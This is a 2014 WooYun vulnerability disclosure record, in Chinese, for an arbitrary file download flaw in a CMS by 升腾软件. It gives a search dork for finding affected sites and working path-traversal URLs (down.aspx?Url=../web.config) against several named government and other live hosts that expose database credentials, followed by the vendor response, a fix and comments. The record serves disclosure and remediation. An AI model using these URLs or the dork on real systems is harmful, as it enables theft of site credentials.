{"id": 2500, "wybug_id": "wooyun-2014-059360", "wybug_title": "某通用型cms任意文件下载", "wybug_corp": "升腾软件", "wybug_author": "梧桐雨", "wybug_date": "2014-05-04 11:03", "wybug_open_date": "2014-08-02 11:04", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件读取利用", "文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向公众公开  简要描述： 任意文件下载 详细说明：  响应疯狗号召，案例就该写清楚。出现该漏洞的厂商叫：升腾软件\nhttp://www.google.de/#newwindow=1&q=/zlxz/down.aspx\n先拿一例看看：http://www.lhfgc.gov.cn/zlxz/down.aspx特征/zlxz/down.aspx http://www.lhfgc.gov.cn/zlxz/down.aspx?Url=../zlxz/down.aspx.cs下载donw.aspx.cs的源码\n\n通过对目录结构的分析，得到web.config在根目录下。因此构造http://www.lhfgc.gov.cn/zlxz/down.aspx?Url=../web.config就可以下载数据库配置数据库名，账户，密码，历历在目\n\n   漏洞证明：  看看其他的一些搜索到的例子：例子2http://www.wlfc.gov.cn/zlxz/down.aspx?Url=../web.config\n\n例子3www.khfdc.com/zlxz/down.aspx?Url=../web.config\n\n例子4http://122.226.168.166/zlxz/down.aspx?Url=../web.config\n\n不一一列举了。。经过对不少案例分析，大多为房产局管理处用的比较多。。希望提供这个有利于cert的分析   修复方案：  关键还是对url参数传入的检测。禁止跨目录即可。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-05-07 21:50 厂商回复： CNVD确认并复现所述多个实例情况，由CNVD尝试通过公开联系渠道协调软件生产厂商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-27 22:37 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  web.config一般都在根目录下的。木有可能网站就跑不起来。话说咋找到这些的？我都是很难才碰到一个    \n     2014-05-28 10:56 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @wefgod 是啊，web.config就等于java web里的web.xml，测试项目的时候遇到的。    \n     2014-05-28 11:29 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @梧桐雨 给力正好遇到……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}